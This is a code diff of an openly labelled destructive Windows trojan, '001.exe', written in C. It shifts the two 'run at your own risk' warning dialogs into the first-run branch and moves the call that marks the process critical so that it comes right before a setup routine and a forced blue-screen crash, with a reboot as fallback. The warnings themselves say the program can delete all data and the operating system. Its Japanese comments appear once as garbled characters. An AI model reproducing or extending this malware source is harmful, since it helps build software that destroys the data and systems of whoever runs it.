@@ -2,18 +2,12 @@
 
 ENTRY_POINT ( _001 )
 {
-	if( MessageBoxW ( NULL, L"WARNING!\n\nYou have ran a Trojan known as 001.exe that has full capacity to delete all of your data and your operating system.\n\nBy continuing, you keep in mind that the creator will not be responsible for any damage caused by this trojan and it is highly recommended that you run this in a testing virtual machine where a snapshot has been made before execution for the sake of entertainment and analysis.\n\nAre you sure you want to run this?", L"Malware alert - 001", MB_YESNO | MB_ICONWARNING ) != IDYES )
-		ExitProcess ( 1 );
-	if( MessageBoxW ( NULL, L"FINAL WARNING!!!\n\nThis Trojan has a lot of destructive potential. You will lose all of your data if you continue, and the creator will not be responsible for any of the damage caused. This is not meant to be malicious but simply for entertainment and educational purposes.\n\nAre you sure you want to continue? This is your final chance to stop this program from execution.", L"Malware alert - 001", MB_YESNO | MB_ICONWARNING ) != IDYES )
-		ExitProcess ( 2 );
-
 	CreateMutexW ( NULL, TRUE, L"001.exe" );
 	if( GetLastError ( ) == ERROR_ALREADY_EXISTS )
 		return 3;
 
 	SeedXorshift ( ( DWORD32_64 ) __rdtsc ( ) );
-	SetProcessCritical ( TRUE );
-
+	
 	WIN_VERSION_INFO version_info = { 0 };
 	if( !GetWinVersion ( &version_info ) )
 		return 1;
@@ -29,6 +23,8 @@ ENTRY_POINT ( _001 )
 
 	if( FlagExists ( L"001Flag.tmp" ) )
 	{
+SetProcessCritical ( TRUE );
+
 		if( FlagExists ( L"001FlagsFINAL" ) )
 			payload_startFINAL ( );
 
@@ -55,9 +51,16 @@ ENTRY_POINT ( _001 )
 	}
 	else
 	{
-		All_Setup ( );                                                	//ƒZƒbƒgƒAƒbƒv
-		if( !BSOD ( 0xC6666666 ) )                      		//ƒuƒ‹ƒXƒN
-			Shutdown ( EWX_REBOOT, NULL );			//ƒuƒ‹ƒXƒNŽ¸”s‚µ‚½‚çƒVƒƒƒbƒgƒ_ƒEƒ“
+	if( MessageBoxW ( NULL, L"WARNING!\n\nYou have ran a Trojan known as 001.exe that has full capacity to delete all of your data and your operating system.\n\nBy continuing, you keep in mind that the creator will not be responsible for any damage caused by this trojan and it is highly recommended that you run this in a testing virtual machine where a snapshot has been made before execution for the sake of entertainment and analysis.\n\nAre you sure you want to run this?", L"Malware alert - 001", MB_YESNO | MB_ICONWARNING ) != IDYES )
+		ExitProcess ( 1 );
+	if( MessageBoxW ( NULL, L"FINAL WARNING!!!\n\nThis Trojan has a lot of destructive potential. You will lose all of your data if you continue, and the creator will not be responsible for any of the damage caused. This is not meant to be malicious but simply for entertainment and educational purposes.\n\nAre you sure you want to continue? This is your final chance to stop this program from execution.", L"Malware alert - 001", MB_YESNO | MB_ICONWARNING ) != IDYES )
+		ExitProcess ( 2 );
+
+SetProcessCritical ( TRUE );
+
+		All_Setup ( );                                                	//ã‚»ãƒƒãƒˆã‚¢ãƒƒãƒ—
+		if( !BSOD ( 0xC6666666 ) )                      		//ãƒ–ãƒ«ã‚¹ã‚¯
+			Shutdown ( EWX_REBOOT, NULL );			//ãƒ–ãƒ«ã‚¹ã‚¯å¤±æ•—ã—ãŸã‚‰ã‚·ãƒ£ãƒƒãƒˆãƒ€ã‚¦ãƒ³
 	}
 
 	return 0;
